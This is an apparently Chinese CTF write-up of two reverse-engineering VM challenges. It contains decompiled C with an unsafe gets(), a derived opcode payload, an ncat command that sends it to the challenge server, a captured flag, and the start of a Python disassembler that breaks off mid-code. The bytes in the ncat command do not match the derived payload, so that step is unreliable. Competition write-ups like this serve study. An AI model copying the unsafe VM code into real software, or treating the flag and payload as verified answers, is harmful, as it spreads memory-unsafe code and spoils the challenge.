<p>逻辑有点乱，丢给ai整理一下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">int main() &#123;</span><br><span class="line">   char *buf = (char*)malloc(100); // EBX</span><br><span class="line"> </span><br><span class="line">   srand(time(NULL));</span><br><span class="line">   for (int i = 0; i &lt; 100; ++i)</span><br><span class="line">     buf[i] = rand() % 0xFF;   // 初始随机内容</span><br><span class="line"> </span><br><span class="line">   char a_to_z[27] = &quot;abcdefghijklmnopqrstuvwxyz&quot;;</span><br><span class="line"> </span><br><span class="line">   char input[100];</span><br><span class="line">   fgets(input, 100, stdin);</span><br><span class="line"> </span><br><span class="line">   size_t len = strlen(input);</span><br><span class="line">   if (len == 0)</span><br><span class="line">     goto done;</span><br><span class="line"> </span><br><span class="line">   int pos = 0;    // 每次步长 +2</span><br><span class="line">   int reg = 0;    // ESI, 由 opcode 3 设置</span><br><span class="line"> </span><br><span class="line">   while (true) &#123;</span><br><span class="line">     size_t len_minus1 = len - 1;</span><br><span class="line">     if (pos + 1 &gt;= len_minus1)</span><br><span class="line">       break;   // 不够形成一条完整指令</span><br><span class="line"> </span><br><span class="line">     unsigned char code = (unsigned char)input[pos];</span><br><span class="line">     unsigned op = code &gt;&gt; 4;   // 高 4 位</span><br><span class="line">     unsigned idx = code &amp; 0x0F;  // 低 4 位</span><br><span class="line"> </span><br><span class="line">     if (op == 3) &#123;</span><br><span class="line">       unsigned char param = (unsigned char)input[pos + 1];</span><br><span class="line">       reg = param &amp; 0x1F;    // 低 5 位</span><br><span class="line">     &#125;</span><br><span class="line"> </span><br><span class="line">     switch (op) &#123;</span><br><span class="line">     case 1:   // 小写 -&gt; 大写</span><br><span class="line">       if (idx &lt; strlen(buf)) &#123;</span><br><span class="line">         unsigned char ch = buf[idx];</span><br><span class="line">         if (&#x27;a&#x27; &lt;= ch &amp;&amp; ch &lt;= &#x27;z&#x27;)</span><br><span class="line">           buf[idx] = ch - 0x20;</span><br><span class="line">       &#125;</span><br><span class="line">       break;</span><br><span class="line"> </span><br><span class="line">     case 2:   // 大写 -&gt; 小写</span><br><span class="line">       if (idx &lt; strlen(buf)) &#123;</span><br><span class="line">         unsigned char ch = buf[idx];</span><br><span class="line">         if (&#x27;A&#x27; &lt;= ch &amp;&amp; ch &lt;= &#x27;Z&#x27;)</span><br><span class="line">           buf[idx] = ch + 0x20;</span><br><span class="line">       &#125;</span><br><span class="line">       break;</span><br><span class="line"> </span><br><span class="line">     case 3:   // 写入 alphabet[reg]</span><br><span class="line">       if (idx &lt; strlen(buf) &amp;&amp; reg &lt; strlen(a_to_z))</span><br><span class="line">         buf[idx] = a_to_z[reg]; // &#x27;a&#x27; + reg</span><br><span class="line">       break;</span><br><span class="line"> </span><br><span class="line">     case 4:   // 写 &#x27;\0&#x27; 终止符</span><br><span class="line">       if (idx &lt; strlen(buf))</span><br><span class="line">         buf[idx] = &#x27;\0&#x27;;</span><br><span class="line">       break;</span><br><span class="line"> </span><br><span class="line">     default:</span><br><span class="line">       // 其他 opcode：不做任何事</span><br><span class="line">       break;</span><br><span class="line">     &#125;</span><br><span class="line"> </span><br><span class="line">     pos += 2;</span><br><span class="line">     len = strlen(input);  // 实际上不会改变，但它每次都重新算一遍</span><br><span class="line">   &#125;</span><br><span class="line"> </span><br><span class="line"> done:</span><br><span class="line">   // 输出 buf（按 C 字符串），再输出换行</span><br><span class="line">   sub_4011CE(std::cout, buf, sub_401348);</span><br><span class="line">   std::cout &lt;&lt; sub_401348;</span><br><span class="line">   return 0;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<p>可以看出这是一个 VM 类的题目，要求我们输入正确的 opcode
才会给出flag，由于这道题名为 HelloWorld ，我们便猜测要求输出固定字符串
"HelloWorld"</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">\1.     H（idx=0）：先写 &#x27;h&#x27; 再转大写</span><br><span class="line">–      &#x27;h&#x27; - &#x27;a&#x27; = 7</span><br><span class="line">–      op3: 0x30 0x07</span><br><span class="line">–      op1: 0x10 0x01（dummy=1）</span><br><span class="line">\2.     e（idx=1）：小写</span><br><span class="line">–      &#x27;e&#x27; - &#x27;a&#x27; = 4</span><br><span class="line">–      op3: 0x31 0x04</span><br><span class="line">\3.     l（idx=2）：小写</span><br><span class="line">–      &#x27;l&#x27; - &#x27;a&#x27; = 11 = 0x0B</span><br><span class="line">–      op3: 0x32 0x0B</span><br><span class="line">\4.     l（idx=3）：小写</span><br><span class="line">–      op3: 0x33 0x0B</span><br><span class="line">\5.     o（idx=4）：小写</span><br><span class="line">–      &#x27;o&#x27; - &#x27;a&#x27; = 14 = 0x0E</span><br><span class="line">–      op3: 0x34 0x0E</span><br><span class="line">\6.     W（idx=5）：先写 &#x27;w&#x27; 再转大写</span><br><span class="line">–      &#x27;w&#x27; - &#x27;a&#x27; = 22 = 0x16</span><br><span class="line">–      op3: 0x35 0x16</span><br><span class="line">–      op1: 0x15 0x01（dummy=1）</span><br><span class="line">\7.     o（idx=6）：小写</span><br><span class="line">–      op3: 0x36 0x0E</span><br><span class="line">\8.     r（idx=7）：小写</span><br><span class="line">–      &#x27;r&#x27; - &#x27;a&#x27; = 17 = 0x11</span><br><span class="line">–      op3: 0x37 0x11</span><br><span class="line">\9.     l（idx=8）：小写</span><br><span class="line">–      op3: 0x38 0x0B</span><br><span class="line">\10.   d（idx=9）：小写</span><br><span class="line">–      &#x27;d&#x27; - &#x27;a&#x27; = 3</span><br><span class="line">–      op3: 0x39 0x03</span><br><span class="line">\11.   终止符 &#x27;\0&#x27;（idx=10）：</span><br><span class="line">–      op4: 0x4A 0x01</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>对应 payload ：</p>
<p>30 07 10 01 31 04 32 0B 33 0B 34 0E 35 16 15 01 36 0E 37 11 38 0B 39
03 4A 01 0A</p>
<p>使用命令发送 payload 给靶机：</p>
<p>python -c "import sys; sys.stdout.buffer.write(b'0b0b0e0e0b4a')" |
ncat 47.107.164.227 43889</p>
<p>得到 flag ：</p>
<figure>
<img src="/images/古剑山2025-初赛-Writeup/clip_image006.jpg"
alt="image" />
<figcaption aria-hidden="true">image</figcaption>
</figure>
<p>flag{351bae89be05efa178d61be9a61ac6b7}</p>
<h3 id="veryez">veryez</h3>
<p>VM题目，输入分别是text和data段，整理一下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _DWORD unsigned int</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _BYTE unsigned char</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> __cdecl <span class="title function_">vm</span><span class="params">(<span class="type">int</span> text, <span class="type">int</span> data)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> opcode; <span class="comment">// eax</span></span><br><span class="line">    <span class="type">int</span> _ip_value;       <span class="comment">// ecx</span></span><br><span class="line">    <span class="type">int</span> v4;              <span class="comment">// eax</span></span><br><span class="line">    <span class="type">int</span> v5;              <span class="comment">// eax</span></span><br><span class="line">    <span class="type">int</span> v6;              <span class="comment">// eax</span></span><br><span class="line">    <span class="type">int</span> v7;              <span class="comment">// eax</span></span><br><span class="line">    <span class="type">int</span> v8;              <span class="comment">// eax</span></span><br><span class="line">    <span class="type">int</span> v9;              <span class="comment">// eax</span></span><br><span class="line">    <span class="type">int</span> ip;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> v10; <span class="comment">// eax</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> v11; <span class="comment">// eax</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> v12; <span class="comment">// esi</span></span><br><span class="line">    <span class="type">int</span> v13;          <span class="comment">// eax</span></span><br><span class="line">    <span class="type">int</span> v14;          <span class="comment">// eax</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> v15; <span class="comment">// esi</span></span><br><span class="line">    <span class="type">int</span> v16;          <span class="comment">// esi</span></span><br><span class="line">    <span class="type">int</span> v17;          <span class="comment">// eax</span></span><br><span class="line">    <span class="type">int</span> v18;          <span class="comment">// esi</span></span><br><span class="line">    <span class="type">int</span> v19;          <span class="comment">// [esp+Ch] [ebp-4h] BYREF</span></span><br><span class="line"></span><br><span class="line">    sub_401390();</span><br><span class="line">    ip = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        opcode = *(_DWORD *)(text + <span class="number">4</span> * ip);</span><br><span class="line">        _ip_value = ++ip;</span><br><span class="line">        <span class="keyword">switch</span> (opcode)</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x101</span>u:</span><br><span class="line">            v19 = pop();</span><br><span class="line">            v4 = pop();</span><br><span class="line">            push(v19 + v4);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x102</span>u:</span><br><span class="line">            v19 = pop();</span><br><span class="line">            v5 = pop();</span><br><span class="line">            push(v19 &amp; v5);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x103</span>u:</span><br><span class="line">            puts_Terminated();</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x104</span>u:</span><br><span class="line">            v6 = *(_DWORD *)(text + <span class="number">4</span> * _ip_value);</span><br><span class="line">            ip = _ip_value + <span class="number">1</span>;</span><br><span class="line">            push(v6);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x105</span>u:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Enter integer: &quot;</span>);</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;v19);</span><br><span class="line">            push(v19);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x201</span>:</span><br><span class="line">            v19 = pop();</span><br><span class="line">            v7 = pop();</span><br><span class="line">            push(v19 - v7);</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x202</span>u:</span><br><span class="line">            v19 = pop();</span><br><span class="line">            v8 = pop();</span><br><span class="line">            push(v19 | v8);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x203</span>u:</span><br><span class="line">            ip = *(_DWORD *)(text + <span class="number">4</span> * _ip_value) &gt;&gt; <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x204</span>u:</span><br><span class="line">            pop();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x205</span>u:</span><br><span class="line">            v9 = pop();</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, v9);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x301</span>:</span><br><span class="line">            v19 = pop() + <span class="number">1</span>;</span><br><span class="line">            push(v19);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x302</span>:</span><br><span class="line">            v19 = pop(); <span class="comment">// 0x302</span></span><br><span class="line">            push(~v19);</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x303</span>:</span><br><span class="line"></span><br><span class="line">            v12 = *(_DWORD *)(text + <span class="number">4</span> * _ip_value); <span class="comment">// 0x303</span></span><br><span class="line">            ip = _ip_value + <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span> (!pop())</span><br><span class="line">                ip = v12 &gt;&gt; <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x304</span>:</span><br><span class="line">            v19 = *(_DWORD *)(pop() + data); <span class="comment">// 0x304</span></span><br><span class="line">            push(v19);</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x305</span>:</span><br><span class="line">            v13 = pop();</span><br><span class="line">            gets(data + v13);</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x401</span>u:</span><br><span class="line">            v19 = pop() - <span class="number">1</span>;</span><br><span class="line">            push(v19);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x402</span>u:</span><br><span class="line">            v19 = pop();</span><br><span class="line">            v14 = pop();</span><br><span class="line">            push(v19 ^ v14);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x403</span>u:</span><br><span class="line">            v15 = *(_DWORD *)(text + <span class="number">4</span> * _ip_value);</span><br><span class="line">            ip = _ip_value + <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span> (pop())</span><br><span class="line">                ip = v15 &gt;&gt; <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x404</span>u:</span><br><span class="line">            v16 = pop();</span><br><span class="line">            *(_DWORD *)(v16 + data) = pop();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x405</span>u:</span><br><span class="line">            v17 = pop();</span><br><span class="line">            <span class="built_in">puts</span>((<span class="type">const</span> <span class="type">char</span> *)(data + v17));</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x504</span>u:</span><br><span class="line">            v19 = *(<span class="type">unsigned</span> __int8 *)(pop() + data);</span><br><span class="line">            push(v19);</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x604</span>u:</span><br><span class="line">            v18 = pop();</span><br><span class="line">            *(_BYTE *)(v18 + data) = pop();</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后AI写个python脚本反汇编</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">List</span>, <span class="type">Dict</span>, <span class="type">Optional</span>, <span class="type">Tuple</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># --- VM 环境模拟 ---</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">VMEnvironment</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;模拟 VM 的堆栈和数据内存&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, data_size=<span class="number">4096</span></span>):</span><br><span class="line">        self.stack: <span class="type">List</span>[<span class="built_in">int</span>] = []</span><br><span class="line">        <span class="comment"># 模拟 data 内存（字节数组），大小为 4KB</span></span><br><span class="line">        self.data_memory = <span class="built_in">bytearray</span>([<span class="number">0</span>] * data_size)</span><br><span class="line">        self.data_base_addr = <span class="number">0x1000</span>  <span class="comment"># 假设数据基址</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">push</span>(<span class="params">self, val: <span class="built_in">int</span></span>):</span><br><span class="line">        <span class="comment"># 栈操作值是 32 位有符号整数</span></span><br><span class="line">        <span class="comment"># 使用 &amp; 0xFFFFFFFF 模拟 32位封装，但 Python 整数是动态的</span></span><br><span class="line">        <span class="comment"># 这里简单地存储整数</span></span><br><span class="line">        self.stack.append(val)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">pop</span>(<span class="params">self</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.stack:</span><br><span class="line">            <span class="keyword">raise</span> IndexError(<span class="string">&quot;Stack underflow!&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> self.stack.pop()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_data_addr</span>(<span class="params">self, offset: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;根据栈上的 offset 获得 data_memory 中的实际索引&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> offset - self.data_base_addr</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 模拟外部 C 函数</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">puts_terminated</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;模拟 puts_Terminated (功能未知，假设打印一个换行符)&quot;&quot;&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[puts_Terminated called]&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">gets_sim</span>(<span class="params">self, offset: <span class="built_in">int</span></span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;模拟 gets(data + offset) - 注意：gets 不安全&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            user_input = <span class="built_in">input</span>(<span class="string">f&quot;[gets] Enter string for data[<span class="subst">&#123;<span class="built_in">hex</span>(offset)&#125;</span>]: &quot;</span>)</span><br><span class="line">        <span class="keyword">except</span> 